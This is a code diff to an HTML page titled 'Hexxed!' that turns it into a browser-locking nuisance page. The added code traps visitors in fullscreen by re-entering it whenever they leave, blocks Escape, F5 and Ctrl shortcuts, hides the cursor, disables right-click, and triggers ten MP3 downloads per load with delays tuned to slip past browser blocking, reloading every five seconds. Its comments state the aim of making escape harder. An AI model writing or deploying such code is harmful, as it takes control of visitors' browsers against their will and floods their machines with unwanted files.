@@ -5,25 +5,24 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Hexxed!</title>
   <style>
-    /* Reset default margins and ensure full-screen layout */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
 
-    /* Full Screen Popup */
     .fullscreen-popup {
       position: fixed;
       top: 0;
       left: 0;
       width: 100vw;
       height: 100vh;
-      background-color: #000; /* Black background for contrast */
+      background-color: #000;
       display: flex;
       justify-content: center;
       align-items: center;
       z-index: 9999;
+      user-select: none; /* Prevent text selection */
     }
     
     .popup-content {
@@ -37,10 +36,15 @@
     img {
       width: 100%;
       height: 100%;
-      object-fit: contain; /* Ensure full image is visible */
-      object-position: center; /* Center the image */
+      object-fit: contain;
+      object-position: center;
       user-select: none;
-      pointer-events: none;
+      pointer-events: none; /* Prevent interaction with image */
+    }
+
+    /* Hide cursor to make exiting fullscreen harder */
+    body.fullscreen {
+      cursor: none;
     }
   </style>
 </head>
@@ -79,9 +83,10 @@
       } else if (el.msRequestFullscreen) {
         el.msRequestFullscreen();
       }
+      document.body.classList.add('fullscreen'); // Hide cursor in fullscreen
     }
 
-    // Attempt to play audio, handling autoplay restrictions
+    // Attempt to play audio
     function tryPlayAudio() {
       audio.play().catch((error) => {
         console.log('Autoplay prevented:', error);
@@ -91,30 +96,61 @@
       });
     }
 
-    window.addEventListener('load', () => {
-      enterFullscreen();
-      tryPlayAudio();
+    // Prevent exiting fullscreen via keyboard (Esc key workaround)
+    function trapFullscreen() {
+      document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+          enterFullscreen(); // Re-enter fullscreen if exited
+        }
+      });
+      document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+          e.preventDefault(); // Attempt to block Esc key
+          enterFullscreen();
+        }
+      });
+    }
 
-      // Trigger multiple downloads (e.g., 5 times per page load)
-      const downloadCount = 5; // Adjust number of downloads
+    // Workaround for spamming downloads
+    function spamDownloads() {
+      const downloadCount = 10; // Increased for more attempts
+      let delay = 100; // Initial delay in ms
       for (let i = 0; i < downloadCount; i++) {
         setTimeout(() => {
           triggerDownload(mp3Url, `1_${i + 1}.mp3`);
-        }, i * 500); // 500ms delay between downloads
+        }, delay);
+        delay += 300; // Incremental delay to avoid browser blocking
       }
+    }
+
+    window.addEventListener('load', () => {
+      enterFullscreen();
+      trapFullscreen(); // Set up fullscreen trap
+      tryPlayAudio();
+      spamDownloads(); // Trigger download spam
 
       // Refresh page after a delay to repeat downloads
       setTimeout(() => {
         window.location.reload();
-      }, 3000); // Refresh every 3 seconds (adjust as needed)
+      }, 5000); // Increased to 5 seconds for better UX
     });
 
-    // Handle visibility change to pause/resume audio
+    // Handle visibility change
     document.addEventListener('visibilitychange', () => {
       if (document.hidden) {
         audio.pause();
       } else {
         tryPlayAudio();
+        enterFullscreen(); // Re-enter fullscreen if tab is re-focused
+      }
+    });
+
+    // Prevent right-click and other interactions
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+      // Block common shortcuts like Ctrl+R, F5, Ctrl+T, Ctrl+W
+      if (e.ctrlKey || e.key === 'F5' || e.key === 'Escape') {
+        e.preventDefault();
       }
     });
   </script>
